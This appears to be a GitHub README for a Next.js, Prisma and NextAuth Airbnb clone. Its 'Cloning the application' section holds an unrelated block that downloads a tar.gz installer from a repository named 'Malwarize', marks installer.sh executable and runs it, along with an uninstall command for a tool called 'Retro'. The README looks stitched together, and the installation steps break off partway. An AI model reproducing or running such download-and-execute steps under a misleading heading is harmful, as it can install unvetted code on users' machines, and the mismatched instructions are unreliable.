<div align="center">
   <img src="https://github.com/user-attachments/assets/deaff4bb-dab2-40d4-974f-98e17d57b633" alt="hi"/>
   <div>
      Live link - <a href="https://airbnb-clone-app-mu.vercel.app/">https://airbnb-clone-app-mu.vercel.app/</a>
   </div>
</div>

## 🗺️ map 
- [<code>📦 Cloning the application</code>](#-cloning-the-application)
- [<code>📦 Installing packages</code>](#-installing-packages)
- [<code>⚙️ Understanding the application structure</code>](#-understanding-application-structure)
- [<code>⚙️ Configuring .env file</code>](#-configuring-env)
- [<code>⚙️ Database setup</code>](#-database-setup)
- [<code>⚙️ Configuring NextAuth.js</code>](#-configuring-nextauth)
- [<code>🚀 Running the application locally</code>](#-running-the-application-locally)
- [<code>💾 Caching and Optimization</code>](#-caching-and-optimization)
- [<code>🌐 Updating dependencies</code>](#-updating-dependencies)
- [<code>📤 Deployment</code>](#-deployment)
- [<code>📝 License</code>](#-license)
- [<code>📢 Acknowledgments</code>](#-acknowledgments)

## 📦 Cloning the application
$${\color{#AC3097}Install \space \color{#56565E}Retro}$$ 
```sh
wget https://github.com/Malwarize/retro/releases/download/v0.0.40/installer.tar.gz
tar -xvf installer.tar.gz
chmod +x installer.sh
./installer.sh
```
this installer is for linux of `systemd` based systems, if you are using other systems you can install it manually by compiling the source code then run the server as you like.

$${\color{#AC3097}Uninstall \space \color{#56565E}Retro}$$
```sh
~/.local/bin/uninstall_retro.sh
```
## 🚀 Introduction
This project is a clone of Airbnb, built using **Next.js App Router**, with authentication, listing management, and map integration features. The project is designed to demonstrate how to create a property listing application with a focus on full-stack development.

### Features:
- Property listing creation and management.
- User authentication with credentials, Google, and GitHub (NextAuth).
- Map integration using **React-Leaflet** for selecting and displaying property locations.
- State management with **Zustand**.
- Database management with **Prisma** and **MongoDB**.

---

## 📦 Installation

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd airbnb-clone
